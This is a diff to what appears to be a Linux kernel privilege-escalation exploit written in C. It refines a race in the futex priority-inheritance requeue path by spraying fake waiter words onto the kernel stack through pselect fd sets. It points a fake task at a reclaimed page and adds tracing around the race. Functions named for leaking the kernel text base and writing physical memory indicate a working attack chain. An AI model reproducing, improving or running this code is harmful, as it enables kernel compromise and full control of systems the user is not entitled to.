@@ -178,6 +178,8 @@ void slide_pselect_put_waiter_word(
   }
 }
 
+int slide_pselect_resout_lane(void);
+
 void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
@@ -193,6 +195,11 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   uintptr_t stack_pi_right = 0;
   uintptr_t stack_pi_left = slide_oracle_target;
   uintptr_t stack_task = fake_task;
+  if (getenv("RMG_SELF_TASK") && fake_w0) {
+    /* Self-referential waiter task: walk derefs stay inside the
+     * controlled reclaimed page (fake_w0 is the fd-set waiter address). */
+    stack_task = fake_w0;
+  }
   slide_pselect_production_stack = 0;
 #if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
     APP_PRODUCTION_STACK_PI_RIGHT_ONLY
@@ -301,12 +308,86 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   };
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
     struct slide_waiter_word *w = &words[i];
+    static unsigned word_mask;
+    static int word_mask_loaded;
+    if (!word_mask_loaded) {
+      word_mask = 0xffffffffu;
+      const char *mask_env = getenv("RMG_FDSET_WORDS_MASK");
+      if (mask_env && *mask_env) {
+        char *end = NULL;
+        errno = 0;
+        unsigned long value = strtoul(mask_env, &end, 0);
+        if (!errno && end != mask_env && !*end) {
+          word_mask = (unsigned)value;
+        }
+      }
+      word_mask_loaded = 1;
+      pr_info("[TRIG] fdset word mask=0x%x\n", word_mask);
+      fflush(stdout);
+    }
+    if (!((word_mask >> w->word) & 1u)) {
+      continue;
+    }
+    if (slide_pselect_resout_lane()) {
+      /* g0s stack layout: the fd-set buffer starts 0x80 below the stale
+       * waiter, so waiter qwords 0-3 land in res_in and q4-q8 in res_out.
+       * Both result arrays mirror the user IN/OUT-set bits for fds that
+       * are readable/writable, so encode every word as per-fd bitmaps:
+       * words 0-3 via readable IN-set fds, words 4-8 via writable
+       * OUT-set fds. Word 9 (deadline) stays zero. */
+      int is_in = w->word >= 0 && w->word <= 3;
+      int is_out = w->word >= 4 && w->word <= 8;
+      if (!is_in && !is_out) {
+        continue;
+      }
+      fd_set *target_set = is_out ? out : in;
+      int qword = is_out ? w->word - 4 : w->word + 1;
+      for (int bit = 0; bit < 64; bit++) {
+        int fd = qword * 64 + bit;
+        if (fd < slide_pselect_nfds && ((w->value >> bit) & 1ULL)) {
+          FD_SET(fd, target_set);
+        }
+      }
+      continue;
+    }
     slide_pselect_put_waiter_word(
         in, out, ex, words_per_set, w->word, w->value, w->name);
   }
 }
 
+static int slide_lane_readable_fd = -1;
+
+int slide_pselect_resout_lane(void) {
+  static int enabled = -1;
+  if (enabled < 0) {
+#if defined(SLIDE_RESOUT_LANE_DEFAULT) && SLIDE_RESOUT_LANE_DEFAULT
+    enabled = getenv("RMG_DISABLE_RESOUT_LANE") == NULL;
+#else
+    enabled = getenv("RMG_RESOUT_LANE") != NULL;
+#endif
+    if (enabled) {
+      pr_info("[TRIG] res_out stamp lane active\n");
+      fflush(stdout);
+    }
+  }
+  return enabled;
+}
+
 void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
+  if (slide_pselect_resout_lane()) {
+    /* read_fd is a pipe write end with its reader held open: every
+     * selected OUT fd becomes immediately writable, so res_out mirrors
+     * the user OUT set exactly. IN-set fds are dup'd from a pipe read
+     * end holding data, so res_in mirrors the IN set. */
+    for (int fd = 0; fd < slide_pselect_nfds; fd++) {
+      if (FD_ISSET(fd, out)) {
+        dup2(read_fd, fd);
+      } else if (FD_ISSET(fd, in) && slide_lane_readable_fd >= 0) {
+        dup2(slide_lane_readable_fd, fd);
+      }
+    }
+    return;
+  }
   for (int fd = 0; fd < slide_pselect_nfds; fd++) {
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
       dup2(read_fd, fd);
@@ -329,7 +410,14 @@ void slide_pselect_stack_copy(void) {
                errno);
     block_fd = pipefd[0];
   }
-  int high_read = fcntl(block_fd, F_DUPFD, slide_pselect_nfds + 16);
+  int high_read;
+  if (slide_pselect_resout_lane()) {
+    /* The stamp source must be writable-on-poll: use the pipe write end
+     * (reader pipefd[0] stays open in this process). */
+    high_read = fcntl(pipefd[1], F_DUPFD, slide_pselect_nfds + 16);
+  } else {
+    high_read = fcntl(block_fd, F_DUPFD, slide_pselect_nfds + 16);
+  }
   if (high_read < 0) {
     pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
     if (block_fd != pipefd[0]) {
@@ -338,6 +426,19 @@ void slide_pselect_stack_copy(void) {
     close(pipefd[0]);
     close(pipefd[1]);
     return;
+  }
+
+  if (slide_pselect_resout_lane() && slide_lane_readable_fd < 0) {
+    int rpipe[2];
+    if (pipe(rpipe) == 0) {
+      if (write(rpipe[1], "RMG", 3) == 3) {
+        slide_lane_readable_fd = rpipe[0];
+        close(rpipe[1]);
+      } else {
+        close(rpipe[0]);
+        close(rpipe[1]);
+      }
+    }
   }
 
   fd_set in;
@@ -378,11 +479,30 @@ void slide_pselect_stack_copy(void) {
   for (int index = 0; index < slide_syscall_pad; index++) {
     syscall(SYS_gettid);
   }
-  atomic_store(&slide_consume_go, 1);
+  int resout_lane = slide_pselect_resout_lane();
+  if (!resout_lane) {
+    /* Timeout lane: the consumer fires while pselect is blocked. */
+    atomic_store(&slide_consume_go, 1);
+  }
   errno = 0;
+  pr_info("[TRIG] pselect enter nfds=%d\n", slide_pselect_nfds);
+  fflush(stdout);
   int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
                          &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
+  if (resout_lane) {
+    /* res_out lane: the stamp lives on THIS thread's kernel stack, so
+     * between the pselect return and the consumer's PI walk this thread
+     * must not enter the kernel again (no prints, no sleeps). Pure
+     * userspace spin only. */
+    atomic_store(&slide_consume_go, 1);
+    while (!atomic_load(&slide_consume_stop)) {
+      __asm__ volatile("" ::: "memory");
+    }
+    atomic_store(&slide_consume_go, 0);
+  }
+  pr_info("[TRIG] pselect ret=%d errno=%d\n", ret, saved_errno);
+  fflush(stdout);
   size_t pselect_elapsed_usec =
       (gettime_ns() - pselect_started) / 1000ULL;
   atomic_store(&slide_consume_go, 0);
@@ -556,10 +676,16 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 #endif
     if (seq == 1) {
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+      if (slide_pselect_resout_lane()) {
+        /* res_out lane: pselect returned instantly by design; the stamp
+         * is on the waiter's kernel stack and the walk fires now. */
+        ready_ok = 1;
+      } else {
       ready_ok = slide_wait_for_pselect_blocked(
           tid, SLIDE_PSELECT_READY_TIMEOUT_USEC,
           SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &ready_elapsed_usec,
           ready_wchan, sizeof(ready_wchan));
+      }
       if (!ready_ok) {
         pr_info("slide pselect ready=0 tid=%d elapsed_usec=%zu wchan=%s; "
                 "trigger skipped\n",
@@ -568,7 +694,9 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
         return NULL;
       }
 #endif
-      usleep(slide_enter_delay_usec());
+      if (!slide_pselect_resout_lane()) {
+        usleep(slide_enter_delay_usec());
+      }
 #if defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
       uint64_t pselect_started_ns = atomic_load(&slide_pselect_started_ns);
       pselect_age_usec = pselect_started_ns
@@ -625,8 +753,22 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     atomic_store(&slide_consume_enter_sched, entered);
     atomic_store(&slide_consume_calls, calls + 1);
     *errno_ptr = 0;
+    if (getenv("RMG_SKIP_CONSUMER_SCHED")) {
+      pr_info("[TRIG] consumer sched_setattr SKIPPED (env)\n");
+      fflush(stdout);
+      atomic_store(&slide_consume_stop, 1);
+      while (atomic_load(&slide_consume_go)) {
+        __asm__ volatile("yield" ::: "memory");
+      }
+      return NULL;
+    }
+    pr_info("[TRIG] consumer sched_setattr tid=%d calls=%d\n", tid, calls + 1);
+    fflush(stdout);
     long ret = sched_setattr_tid(tid, (calls % 19) + 1);
     int saved_errno = *errno_ptr;
+    pr_info("[TRIG] consumer sched_setattr ret=%ld errno=%d\n", ret,
+            saved_errno);
+    fflush(stdout);
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
     pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
             "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
@@ -652,10 +794,14 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
 
+  pr_info("[TRIG] waiter enter tid=%d\n", tid);
+  fflush(stdout);
   if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter lock chain errno=%d\n", errno);
     return NULL;
   }
+  pr_info("[TRIG] waiter locked pi_chain\n");
+  fflush(stdout);
 
   atomic_store(&slide_waiter_ready, 1);
   while (!atomic_load(&slide_owner_started)) {
@@ -681,20 +827,30 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     return NULL;
   }
   atomic_store(&slide_waiter_ok, 1);
+  pr_info("[TRIG] waiter parked-ok, waiting for deadlock_seen\n");
+  fflush(stdout);
   while (!atomic_load(&slide_deadlock_seen)) {
     __asm__ volatile("yield" ::: "memory");
   }
+  pr_info("[TRIG] waiter deadlock_seen, unlocking pi_chain\n");
+  fflush(stdout);
   if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter unlock chain errno=%d\n", errno);
     atomic_store(&slide_route_done, 1);
     return NULL;
   }
+  pr_info("[TRIG] waiter unlocked pi_chain\n");
+  fflush(stdout);
   while (!atomic_load(&slide_owner_acquired)) {
     __asm__ volatile("yield" ::: "memory");
   }
 
+  pr_info("[TRIG] waiter owner acquired, stack copy next\n");
+  fflush(stdout);
   slide_pselect_stack_copy();
   atomic_store(&slide_route_done, 1);
+  pr_info("[TRIG] waiter route done\n");
+  fflush(stdout);
 
   for (;;) {
     sleep(1);
@@ -702,10 +858,14 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_owner_thread(void *arg __attribute__((unused))) {
+  pr_info("[TRIG] owner enter\n");
+  fflush(stdout);
   if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide owner lock target errno=%d\n", errno);
     return NULL;
   }
+  pr_info("[TRIG] owner locked pi_target\n");
+  fflush(stdout);
 
   while (!atomic_load(&slide_waiter_ready)) {
     usleep(1000);
@@ -811,9 +971,14 @@ uint64_t slide_child_leak_stext(void) {
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
+    pr_info("[TRIG] cmp_requeue_pi enter poll=%d\n", requeue_polls);
+    fflush(stdout);
     requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                            &slide_f_pi_target, 0);
     requeue_errno = errno;
+    pr_info("[TRIG] cmp_requeue_pi ret=%ld errno=%d poll=%d\n",
+            requeue_ret, requeue_errno, requeue_polls);
+    fflush(stdout);
     if (requeue_ret != 0) {
       break;
     }
@@ -859,9 +1024,14 @@ static int slide_child_trigger_write(void) {
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
+    pr_info("[TRIG] cmp_requeue_pi enter poll=%d\n", requeue_polls);
+    fflush(stdout);
     requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                            &slide_f_pi_target, 0);
     requeue_errno = errno;
+    pr_info("[TRIG] cmp_requeue_pi ret=%ld errno=%d poll=%d\n",
+            requeue_ret, requeue_errno, requeue_polls);
+    fflush(stdout);
     if (requeue_ret != 0) {
       break;
     }
@@ -900,9 +1070,12 @@ static int slide_trigger_physical_state(void) {
     _exit(slide_child_trigger_write() ? 0 : 1);
   }
   int status = 0;
+  pr_info("[TRIG] parent waiting for trigger child pid=%d\n", child);
+  fflush(stdout);
   SYSCHK(waitpid(child, &status, 0));
   int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
   pr_info("p0 physical write status=%d ok=%d\n", status, ok);
+  fflush(stdout);
   return ok;
 }
 
